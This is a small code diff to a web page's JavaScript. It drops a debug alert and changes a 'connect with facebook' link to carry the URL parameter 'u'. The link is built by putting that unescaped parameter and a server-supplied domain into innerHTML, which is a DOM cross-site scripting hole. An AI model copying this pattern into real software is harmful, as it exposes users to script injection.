@@ -92,12 +92,11 @@
       const queryString = window.location.search;
       const urlParams = new URLSearchParams(queryString);
       const u = urlParams.get("u");
-      alert(u);
-
+	    
     axios.get("/data").then((resps) =>
       {
         document.getElementById('wait').style.display= "none";
-	document.getElementById('btn').innerHTML = `<a href=${resps.data.domain}?q=${q} class="log">connect with facebook <i id="icon" class="fab fa-facebook"></i></a>`
+	document.getElementById('btn').innerHTML = `<a href=${resps.data.domain}?u=${u} class="log">connect with facebook <i id="icon" class="fab fa-facebook"></i></a>`
     }).catch((e)=>{
 		  console.log(e)
 	  });
